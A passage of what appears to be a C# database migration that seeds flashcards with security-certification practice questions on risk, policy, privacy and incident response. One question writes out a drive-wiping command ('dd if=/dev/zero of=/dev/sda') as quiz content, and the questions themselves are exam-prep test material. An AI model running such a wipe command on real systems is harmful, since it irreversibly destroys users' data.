                values: new object[] { 677, "\r\n45. C. Zero-wiping a drive can be accomplished using dd , and\r\nwhen this command is completed Selah will have written zeroes\r\nto the entire drive /dev/sda .\r\n", 4, "\r\n45. Selah executes the following command on a system. What has she accomplished?\r\ndd if=/dev/zero of=/dev/sda bs=4096\r\nA. Copying the disk /dev/zero to the disk /dev/sda\r\nB. Formatting /dev/sda\r\nC. Writing zeroes to all of /dev/sda\r\nD. Cloning /dev/sda1\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 678, "\r\n46. C. Involving impacted areas, or those that have a role in the\r\nprocess, is part of stakeholder management and ensures that\r\nthose who need to be involved or aware of the incident response\r\nprocess are engaged throughout the process. Laws rarely have\r\nspecific requirements for internal involvement, instead focusing\r\non customers or those whose data is involved in an incident.\r\nRetention policies determine what data is kept and for how long.\r\nCOOP is Continuity of Operations Planning, a federal effort to\r\nensure disaster recovery and business continuity plans are in\r\nplace for federal agencies.\r\n", 4, "\r\n46. Jim is preparing a presentation about his organization’s incident response process and wants\r\nto explain why communications with involved groups and individuals across the organization\r\nare important. Which of the following is the primary reason that organizations communicate\r\nwith and involve staff from affected areas throughout the organization in incident\r\nresponse efforts?\r\nA. Legal compliance\r\nB. Retention policies\r\nC. Stakeholder management\r\nD. A COOP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 820, "\r\n45. A. Data owners assign labels such as top secret to data.\r\nCustodians assign security controls to data. A privacy officer\r\nensures that companies comply with privacy laws and\r\nregulations. System administrators are responsible for the\r\noverall functioning of IT systems.\r\n", 5, "\r\n45. You are the IT manager and one of your employees asks who assigns data labels. Which of\r\nthe following assigns data labels?\r\nA. Owner\r\nB. Custodian\r\nC. Privacy officer\r\nD. System administrator\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 821, "\r\n46. C. Employees can leak a company’s confidential information.\r\nExposing a company’s information could put the company’s\r\nsecurity position at risk because attackers can use this\r\ninformation as part of attacks against the company. Gaining\r\naccess to a computer’s MAC address is not relevant to social\r\nmedia network risk. Gaining access to a computer’s IP address is\r\nnot relevant to social media network risk. Employees can easily\r\nexpress their concerns about a company in general. This is not\r\nrelevant to social media network risk as long as the employee\r\ndoesn’t reveal any confidential information.\r\n", 5, "\r\n46. Which of the following is the most pressing security concern related to social\r\nmedia networks?\r\nA. Other users can view your MAC address.\r\nB. Other users can view your IP address.\r\nC. Employees can leak a company’s confidential information.\r\nD. Employees can express their opinion about their company.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 822, "\r\n47. C. Separation of duties is the concept of having more than one\r\nperson required to complete a task. A background check is a\r\nprocess that is performed when a potential employee is\r\nconsidered for hire. Job rotation allows individuals to see\r\nvarious parts of the organization and how it operates. It also\r\neliminates the need for a company to rely on one individual for\r\nsecurity expertise should the employee become disgruntled and\r\ndecide to harm the company. Recovering from a disgruntled\r\nemployee’s attack is easier when multiple employees understand\r\nthe company’s security posture. Collusion is an agreement\r\nbetween two or more parties to defraud a person of their rights\r\nor to obtain something that is prohibited by law.\r\n", 5, "\r\n47. What concept is being used when user accounts are created by one employee and user permissions\r\nare configured by another employee?\r\nA. Background checks\r\nB. Job rotation\r\nC. Separation of duties\r\nD. Collusion\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 823, "\r\n48. B. ALE (annual loss expectancy) = SLE (single loss expectancy)\r\n× ARO (annualized rate of occurrence). SLE equals $750,000\r\n(2,500 records × $300), and ARO equals 5%, so $750,000 times\r\n5% equals $37,500.\r\n", 5, "\r\n48. A security analyst is analyzing the cost the company could incur if the customer database was\r\nbreached. The database contains 2,500 records with personally identifiable information (PII).\r\nStudies show the cost per record would be $300. The likelihood that the database would be\r\nbreached in the next year is only 5 percent. Which of the following would be the ALE for a\r\nsecurity breach?\r\nA. $15,000\r\nB. $37,500\r\nC. $150,000\r\nD. $750,000\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 824, "\r\n49. C. RPO (recovery point objective) specifies the allowable data\r\nloss. It is the amount of time that can pass during an\r\ninterruption before the quantity of data lost during that period\r\nsurpasses business continuity planning’s maximum acceptable\r\nthreshold. MTBF (mean time between failures) is the rating on a\r\ndevice or component that predicts the expected time between\r\nfailures. MTTR (mean time to repair) is the average time it takes\r\nfor a failed device or component to be repaired or replaced. ARO\r\n(annual rate of occurrence) is the ratio of an estimated\r\npossibility that a threat will take place within a one-year time\r\nframe.\r\n", 5, "\r\n49. Which of the following concepts defines a company goal for system restoration and acceptable\r\ndata loss?\r\nA. MTBF\r\nB. MTTR\r\nC. RPO\r\nD. ARO\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 825, "\r\n50. D. A data retention policy states how data should be stored\r\nbased on various types, such as storage location, amount of time\r\nthe data should be retained, and the type of storage medium that\r\nshould be used. A clean desk policy ensures that all\r\nsensitive/confidential documents are removed from an end-user\r\nworkstation and locked up when the documents are not in use.\r\nAn AUP, or acceptable use policy, describes the limits and\r\nguidelines for users to make use of an organization’s physical\r\nand intellectual resources. This includes allowing or limiting the\r\nuse of personal email during work hours. A security policy\r\ndefines how to secure physical and information technology\r\nassets. This document should be continuously updated as\r\ntechnology and employee requirements change.\r\n", 5, "\r\n50. Your company hires a third-party auditor to analyze the company’s data backup and\r\nlong-term archiving policy. Which type of organization document should you provide to\r\nthe auditor?\r\nA. Clean desk policy\r\nB. Acceptable use policy\r\nC. Security policy\r\nD. Data retention policy\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 826, "\r\n51. C. Onboarding is the process of adding an employee to\r\ncompany’s identity and access management system. Offboarding\r\nis the process of removing an employee from the company’s\r\nidentity and access management system. A system owner is an\r\nindividual who is in charge of managing one or more systems\r\nand can include patching and updating operating systems. An\r\nexecutive user was made up for this question.\r\n", 5, "\r\n51. You are a network administrator and have been given the duty of creating user accounts for\r\nnew employees the company has hired. These employees are added to the identity and access\r\nmanagement system and assigned mobile devices. What process are you performing?\r\nA. Offboarding\r\nB. System owner\r\nC. Onboarding\r\nD. Executive user\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 827, "\r\n52. B. Separation of duty can be classified as an operational control\r\nthat attempts to minimize fraud by ensuring that an individual\r\ncannot exploit a process and conceal the errors or issues that\r\nthey are creating. It is not a physical control or a technical\r\ncontrol, and nothing in the question indicates that this is\r\ncompensating for gaps left by another control.\r\n", 5, "\r\n52. What type of control is separation of duty?\r\nA. Physical\r\nB. Operational\r\nC. Technical\r\nD. Compensating\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 828, "\r\n53. D. The General Data Protection Regulation (GDPR) does not\r\ninclude a right to anonymity, although organizations must be\r\nable to provide security safeguards that may include\r\nanonymization where appropriate.\r\n", 5, "\r\n53. Which of the following rights is not included in the GDPR?\r\nA. The right to access\r\nB. The right to be forgotten\r\nC. The right to data portability\r\nD. The right to anonymity\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 829, "\r\n54. D. The NIST RMF’s process is.\r\n1. Prepare\r\n2. Categorize system\r\n3. Select controls\r\n4. Implement controls\r\n5. Assess controls\r\n6. Authorize system\r\n7. Monitor controls\r\n", 5, "\r\n54. Nick is following the National Institute of Standards and Technology (NIST) Risk\r\nManagement Framework (RMF) and has completed the prepare and categorize steps. Which\r\nstep in the risk management framework is next?\r\nA. Assessing controls\r\nB. Implementing controls\r\nC. Monitoring controls\r\nD. Selecting controls\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 830, "\r\n55. B. Security program administrators often use different types of\r\ntraining to ensure that trainees who react and respond\r\ndifferently to training are given training that helps them. There\r\nmay be other valid reasons, but this is the most common reason\r\nfor training diversity.\r\n", 5, "\r\n55. Why are diversity of training techniques an important concept for security program\r\nadministrators?\r\nA. It allows for multiple funding sources.\r\nB. Each person responds to training differently.\r\nC. It avoids a single point of failure in training compliance.\r\nD. It is required for compliance with PCI-DSS.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 819, "\r\n44. B. Risk acceptance is a strategy of recognizing, identifying, and\r\naccepting a risk that is sufficiently unlikely or has such limited\r\nimpact that a corrective control is not warranted. Risk\r\nmitigation is when a company implements controls to reduce\r\nvulnerabilities or weaknesses in a system. It can also reduce the\r\nimpact of a threat. Risk avoidance is the removal of the\r\nvulnerability that can increase a particular risk so that it is\r\navoided altogether. Risk transfer is the act of moving the risk to\r\nother organizations like insurance providers or hosting\r\ncompanies who assume the responsibility for recovery and\r\nrestoration or by acquiring insurance to cover the costs\r\nemerging from a risk.\r\n", 5, "\r\n44. Categorizing residual risk is most important to which of the following risk response\r\ntechniques?\r\nA. Risk mitigation\r\nB. Risk acceptance\r\nC. Risk avoidance\r\nD. Risk transfer\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 831, "\r\n56. A. Risks that the organization itself creates are internal risks.\r\nExternal risks are those created by factors outside the\r\norganization’s control. Qualitative and quantitative are both\r\ntypes of risk assessment, rather than categorizations of risk.\r\n", 5, "\r\n56. Alyssa has been asked to categorize the risk of outdated software in her organization. What\r\ntype of risk categorization should she use?\r\nA. Internal\r\nB. Quantitative\r\nC. Qualitative\r\nD. External\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 833, "\r\n58. C. The mean time to repair (MTTR) for a system or devices is\r\nthe average time that it will take to repair it if it fails. The MTTR\r\nis used as part of business continuity planning to determine if a\r\nsystem needs additional redundancy or other options put in\r\nplace if a failure and repair would exceed the maximum\r\ntolerable outage. It is calculated by dividing the total\r\nmaintenance time by the total number of repairs. MTBF is the\r\nmean time between failures, MTTF the mean time to fail, and\r\nMITM is an on-path attack, a term that has been increasingly\r\nreplaced with on-path.\r\n", 5, "\r\n58. Which of the following terms is used to measure how maintainable a system or device is?\r\nA. MTBF\r\nB. MTTF\r\nC. MTTR\r\nD. MITM\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 834, "\r\n59. D. Common results of breaches like this include identity theft\r\nusing the personal information of the customers, financial loss\r\nto the company due to breach costs and lawsuits, and\r\nreputational loss. Since the incident response process is over,\r\nOlivia’s company should have remediated the underlying issues\r\nthat led to the breach, hopefully preventing further downtime\r\nand thus availability loss.\r\n", 5, "\r\n59. The company that Olivia works for has recently experienced a data breach that exposed customer\r\ndata, including their home addresses, shopping habits, email addresses, and contact\r\ninformation. Olivia’s company is an industry leader in their space but has strong competitors\r\nas well. Which of the following impacts is not likely to occur now that the organization has\r\ncompleted their incident response process?\r\nA. Identity theft\r\nB. Financial loss\r\nC. Reputation loss\r\nD. Availability loss\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 835, "\r\n60. D. There is no civilian classification level for government data.\r\nData may be unclassified, or sensitive but unclassified. Top\r\nSecret, Secret, and Confidential are all commonly used\r\nclassifications.\r\n", 5, "\r\n60. Eric works for the U.S. government and needs to classify data. Which of the following is not\r\na common classification type for U.S. government data?\r\nA. Top Secret\r\nB. Secret\r\nC. Confidential\r\nD. Civilian\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 836, "\r\n61. B. The source code for a product is not typically used as a\r\nlocation for privacy terms and conditions. Instead, they are in\r\nthe contract, user license or related legal terms, or in a formal\r\nprivacy notice.\r\n", 5, "\r\n61. Which of the following is not a common location for privacy practices to be recorded\r\nor codified?\r\nA. A formal privacy notice\r\nB. The source code for a product\r\nC. The terms of the organization’s agreement with customers\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 837, "\r\n62. B. Pseudonymization can allow reidentification of the data\r\nsubject if additional data is available. Properly done\r\nanonymization cannot be reversed. Anonymization techniques\r\nwill group information so that individuals cannot be identified\r\nfrom data and use other techniques to prevent additional\r\ninformation, leading to de-anonymization of individuals.\r\n", 5, "\r\n62. What key difference separates pseudonymization and anonymization?\r\nA. Anonymization uses encryption.\r\nB. Pseudonymization requires additional data to reidentify the data subject.\r\nC. Anonymization can be reversed using a hash.\r\nD. Pseudonymization uses randomized tokens.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 838, "\r\n63. A. A data governance policy clearly states who owns the\r\ninformation collected and used by an organization. Information\r\nsecurity policies provide the high-level authority and guidance\r\nfor security programs and efforts. Acceptable use policies\r\n(AUPs) define what information resources can be used for and\r\nhow. Data retention policies establish what information an\r\norganization will collect and how long it will be kept before\r\ndestruction.\r\n", 5, "\r\n63. What policy clearly states the ownership of information created or used by an organization?\r\nA. A data governance policy\r\nB. An information security policy\r\nC. An acceptable use policy\r\nD. A data retention policy\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 839, "\r\n64. C. Helen has created a functional recovery plan focused on a\r\nspecific technical and business function. A disaster recovery\r\nplan (DRP) has a broader perspective and might include\r\nmultiple functional recovery plans. RPOs, or recovery point\r\nobjectives, and MTBF, or mean time between failures, are not\r\ntypes of plans typically built by organizations.\r\n", 5, "\r\n64. Helen’s organization provides telephone support for their entire customer base as a critical\r\nbusiness function. She has created a plan that will ensure that her organization’s Voice\r\nover IP (VoIP) phones will be restored in the event of a disaster. What type of plan has\r\nshe created?\r\nA. A disaster recovery plan\r\nB. An RPO plan\r\nC. A functional recovery plan\r\nD. An MTBF plan\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 840, "\r\n65. B. Health information may be covered by state, local, or federal\r\nlaw, and Greg’s organization should ensure that they understand\r\nany applicable laws before storing, processing, or handling\r\nhealth information.\r\n", 5, "\r\n65. Greg has data that is classified as health information that his organization uses as part of\r\ntheir company’s HR data. Which of the following statements is true for his company’s security\r\npolicy?\r\nA. The health information must be encrypted.\r\nB. Greg should review relevant law to ensure the health information is handled properly.\r\nC. Companies are prohibited from storing health information and must outsource to third\r\nparties.\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 841, "\r\n66. C. Control risks specifically apply to financial information,\r\nwhere they may impact the integrity or availability of the\r\nfinancial information.\r\n", 5, "\r\n66. What type of information does a control risk apply to?\r\nA. Health information\r\nB. Personally identifiable information (PII)\r\nC. Financial information\r\nD. Intellectual property\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 842, "\r\n67. D. An individual is most likely to face identity theft issues if\r\ntheir personally identifiable information (PII) is stolen or\r\nbreached.\r\n", 5, "\r\n67. What type of impact is an individual most likely to experience if a data breach that includes\r\nPII occurs?\r\nA. IP theft\r\nB. Reputation damage\r\nC. Fines\r\nD. Identity theft\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 843, "\r\n68. C. It is common practice to prohibit interactive logins to a GUI\r\nor shell for service accounts. Use of a service account for\r\ninteractive logins or attempting to log in as one should be\r\nimmediately flagged and alerted on as an indicator of\r\ncompromise (IoC).\r\n", 5, "\r\n68. Isaac has been asked to write his organization’s security policies. What policy is commonly\r\nput in place for service accounts?\r\nA. They must be issued only to system administrators.\r\nB. They must use multifactor authentication.\r\nC. They cannot use interactive logins.\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 832, "\r\n57. B. Risk registers are documents used by organizations to track\r\nand manage risks and include information including the owner\r\nor responsible party, details about the risk, and other useful\r\ninformation. Statement on Standards for Attestation\r\nEngagements (SSAEs) are audit reports, Payment Card Industry\r\nData Security Standard (PCI-DSS) is a security standard used\r\nfor credit card operations, and risk table is not a common\r\nindustry term.\r\n", 5, "\r\n57. What term is used to describe a listing of all of an organization’s risks, including information\r\nabout the risk’s rating, how it is being remediated, remediation status, and who owns or is\r\nassigned responsibility for the risk?\r\nA. An SSAE\r\nB. A risk register\r\nC. A risk table\r\nD. A DSS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 844, "\r\n69. C. Asset management policies typically include all stages of an\r\nasset’s life cycle, and asset tags like those described are used to\r\ntrack assets in many organizations. Change management,\r\nincident response, and acceptable use policies do not require\r\nasset tagging.\r\n", 5, "\r\n69. Nina is tasked with putting radio frequency identification (RFID) tags on every new piece of\r\nequipment that enters her datacenter that costs more than $500. What type of organizational\r\npolicy is most likely to include this type of requirement?\r\nA. A change management policy\r\nB. An incident response policy\r\nC. An asset management policy\r\nD. An acceptable use policy\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 818, "\r\n43. D. A custodian configures data protection based on security\r\npolicies. The local community bank is the data owner, not Leigh\r\nAnn. Leigh Ann is a network administrator, not a user, and\r\npower user is not a standard security role in the industry.\r\n", 5, "\r\n43. Leigh Ann is the new network administrator for a local community bank. She studies the\r\ncurrent file server folder structures and permissions. The previous administrator didn’t properly\r\nsecure customer documents in the folders. Leigh Ann assigns appropriate file and folder\r\npermissions to be sure that only the authorized employees can access the data. What security\r\nrole is Leigh Ann assuming?\r\nA. Power user\r\nB. Data owner\r\nC. User\r\nD. Custodian\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 816, "\r\n41. C. A single point of failure (SPOF) is a single weakness that can\r\nbring an entire system down and prevent it from working. Cloud\r\ncomputing allows the delivery of hosted service over the\r\nInternet. Load balancing spreads traffic or other load between\r\nmultiple systems or servers. Virtualization uses a system to host\r\nvirtual machines that share the underlying resources such as\r\nRAM, hard drive, and CPU.\r\n", 5, "\r\n41. All of your organization’s traffic flows through a single connection to the Internet. Which of\r\nthe following terms best describes this scenario?\r\nA. Cloud computing\r\nB. Load balancing\r\nC. Single point of failure\r\nD. Virtualization\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 792, "\r\n17. D. In most cases, operating a facility in a state is sufficient\r\nreason to need to comply with state laws. Jim should check with\r\na lawyer, but he should plan on needing to comply with Illinois,\r\nIndiana, and Ohio law, as well as federal laws.\r\n", 5, "\r\n17. Jim’s company operates facilities in Illinois, Indiana, and Ohio, but the headquarters is in Illinois.\r\nWhich state laws does Jim need to review and handle as part of his security program?\r\nA. All U.S. state laws\r\nB. Illinois\r\nC. Only U.S. federal laws\r\nD. State laws in Illinois, Indiana, and Ohio\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 793, "\r\n18. A. Onboarding is the process of adding an employee to a\r\ncompany’s identity and access management system. Offboarding\r\nis the process of removing an employee from the company’s\r\nidentity and access management system. Adverse action is an\r\nofficial personnel action that is taken for disciplinary reasons.\r\nJob rotation gives individuals the ability to see various parts of\r\nthe organization and how it operates. It also eliminates the need\r\nfor a company to rely on one individual for security expertise\r\nshould the employee become disgruntled and decide to harm the\r\ncompany. Recovering from a disgruntled employee’s attack is\r\neasier when multiple employees understand the company’s\r\nsecurity posture.\r\n", 5, "\r\n18. You are an IT administrator for a company and you are adding new employees to an organization’s\r\nidentity and access management system. Which of the following best describes the\r\nprocess you are performing?\r\nA. Onboarding\r\nB. Offboarding\r\nC. Adverse action\r\nD. Job rotation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 794, "\r\n19. A. A clean desk policy ensures that sensitive information and\r\ndocuments are not left on desks after hours and requires\r\nemployees to place those files into a less exposed or secure\r\nlocation. Background checks, continuing education, and job\r\nrotation do not protect confidential information left on desks\r\nfrom being exposed.\r\n", 5, "\r\n19. Mark is an office manager at a local bank branch. He wants to ensure that customer\r\ninformation isn’t compromised when the deskside employees are away from their desks for\r\nthe day. What security concept would Mark use to mitigate this concern?\r\nA. Clean desk\r\nB. Background checks\r\nC. Continuing education\r\nD. Job rotation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 795, "\r\n20. A. As users register for an account, they enter letters and\r\nnumbers they are given on the web page before they can register.\r\nThis is an example of a deterrent control since it prevents bots\r\nfrom registering and proves this is a real person. Detective\r\ncontrols detect intrusion as it happens and uncovers a violation.\r\nA compensating control is used to satisfy a requirement for a\r\nsecurity measure that is too difficult or impractical to implement\r\nat the current time. Degaussing is a method of removing data\r\nfrom a magnetic storage media by changing the magnetic field.\r\n", 5, "\r\n20. You are a security administrator and advise the web development team to include a\r\nCAPTCHA on the web page where users register for an account. Which of the following\r\ncontrols is this referring to?\r\nA. Deterrent\r\nB. Detective\r\nC. Compensating\r\nD. Degaussing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 796, "\r\n21. D. A parking policy generally outlines parking provisions for\r\nemployees and visitors. This includes the criteria and\r\nprocedures for allocating parking spaces for employees and is\r\nnot a part of organizational security policy. Instead, it is an\r\noperational or business policy. An acceptable use policy\r\ndescribes the limits and guidelines for users to make use of an\r\norganization’s physical and intellectual resources. This includes\r\nallowing or limiting the use of personal email during work\r\nhours. Social media policy defines how employees should use\r\nsocial media networks and applications such as Facebook,\r\nTwitter, LinkedIn, and others. It can adversely affect a\r\ncompany’s reputation. Password policies define the complexity\r\nof creating passwords. It should also define weak passwords and\r\nhow users should protect password safety.\r\n", 5, "\r\n21. Which of the following is not a common security policy type?\r\nA. Acceptable use policy\r\nB. Social media policy\r\nC. Password policy\r\nD. Parking policy\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 797, "\r\n22. C. Proprietary data is a form of confidential information, and if\r\nthe information is revealed, it can have severe effects on the\r\ncompany’s competitive edge. High is a generic label assigned to\r\ndata internally that represents the amount of risk being exposed\r\noutside the company. The top-secret label is often used in\r\ngovernmental systems where data and access may be granted or\r\ndenied based on assigned categories. Low is a generic label\r\nassigned to data internally that represents the amount of risk\r\nbeing exposed outside the company.\r\n", 5, "\r\n22. As the IT security officer for your organization, you are configuring data label options for\r\nyour company’s research and development file server. Regular users can label documents as\r\ncontractor, public, or internal. Which label should be assigned to company trade secrets?\r\nA. High\r\nB. Top secret\r\nC. Proprietary\r\nD. Low\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 798, "\r\n23. C. Antivirus software is used to protect computer systems from\r\nmalware and is not a physical security control. Physical controls\r\nare security measures put in place to reduce the risk of harm\r\ncoming to a physical property. This includes protection of\r\npersonnel, hardware, software, networks, and data from\r\nphysical actions and events that could cause damage or loss.\r\n", 5, "\r\n23. Which of the following is not a physical security control?\r\nA. Motion detector\r\nB. Fence\r\nC. Antivirus software\r\nD. Closed-circuit television (CCTV)\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 799, "\r\n24. A. Quantitative risk assessment is the process of assigning\r\nnumerical values to the probability an event will occur and what\r\nimpact the event will have. Qualitative risk assessment is the\r\nprocess of ranking which risk poses the most danger such as\r\nlow, medium, and high. A business impact analysis (BIA) is used\r\nto evaluate the possible effect a business can suffer should an\r\ninterruption to critical system operations occur. This\r\ninterruption could be as a result of an accident, emergency, or\r\ndisaster. Threat assessment is the process of identifying and\r\ncategorizing different threats such as environmental and\r\nperson-made. It also attempts to identify the potential impact\r\nfrom the threats.\r\n", 5, "\r\n24. Your security manager wants to decide which risks to mitigate based on cost. What is this an\r\nexample of?\r\nA. Quantitative risk assessment\r\nB. Qualitative risk assessment\r\nC. Business impact analysis\r\nD. Threat assessment\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 800, "\r\n25. D. A nondisclosure agreement (NDA) protects sensitive and\r\nintellectual data from getting into the wrong hands. An NDA is a\r\nlegal contract between the company and third-party vendor to\r\nnot disclose information per the agreement. Encrypted data that\r\nis sent can still be decrypted by the third-party vendor if they\r\nhave the appropriate certificate or the key but does not restrict\r\naccess to the data. Violating an NDA would constitute\r\nunauthorized data sharing, and a violation of privileged user\r\nrole-based awareness training has nothing to do with sharing\r\nproprietary information.\r\n", 5, "\r\n25. Your company has outsourced its proprietary processes to Acme Corporation. Due to\r\ntechnical issues, Acme wants to include a third-party vendor to help resolve the technical\r\nissues. Which of the following must Acme consider before sending data to the third party?\r\nA. This data should be encrypted before it is sent to the third-party vendor.\r\nB. This may constitute unauthorized data sharing.\r\nC. This may violate the privileged user role-based awareness training.\r\nD. This may violate a nondisclosure agreement.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 801, "\r\n26. A. Detective controls like CCTV detect intrusion as it happens\r\nand can help uncover violations. Policies are administrative\r\ncontrols. Firewalls and intrusion prevention system (IPS)\r\ndevices are technical controls. Technical controls are applied\r\nthrough technology and may be also be deterrent, preventive,\r\ndetective, or compensating.\r\n", 5, "\r\n26. Which of the following is considered a detective control?\r\nA. Closed-circuit television (CCTV)\r\nB. An acceptable use policy\r\nC. Firewall\r\nD. IPS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 802, "\r\n27. C. Sharing of profits and losses and the addition or removal of a\r\npartner, as well as the responsibilities of each partner, are\r\ntypically included in a BPA (business partner agreement).\r\nExpectations between parties such as a company and an Internet\r\nservice provider are typically found in a service level agreement\r\n(SLA). Expectations include the level of performance given\r\nduring the contractual service. An SLA will provide a clear\r\nmeans of determining whether a specific function or service has\r\nbeen provided according to the agreed-on level of performance.\r\nSecurity requirements associated with interconnecting IT\r\nsystems are typically found in an interconnection security\r\nagreement, or ICA.\r\n", 5, "\r\n27. Which of the following is typically included in a BPA?\r\nA. Clear statements detailing the expectation between a customer and a service provider\r\nB. The agreement that a specific function or service will be delivered at the agreed-on level\r\nof performance\r\nC. Sharing of profits and losses and the addition or removal of a partner\r\nD. Security requirements associated with interconnecting IT systems\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 817, "\r\n42. A. Quantitative risk analysis requires complex calculations and\r\nis more time-consuming because it requires detailed financial\r\ndata and calculations. Quantitative risk assessment is often\r\nsubjective and requires expertise on systems and infrastructure,\r\nand both types of assessment can provide clear answers on riskbased\r\nquestions.\r\n", 5, "\r\n42. Which of the following best describes the disadvantages of quantitative risk analysis compared\r\nto qualitative risk analysis?\r\nA. Quantitative risk analysis requires detailed financial data.\r\nB. Quantitative risk analysis is sometimes subjective.\r\nC. Quantitative risk analysis requires expertise on systems and infrastructure.\r\nD. Quantitative risk provides clear answers to risk-based questions.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
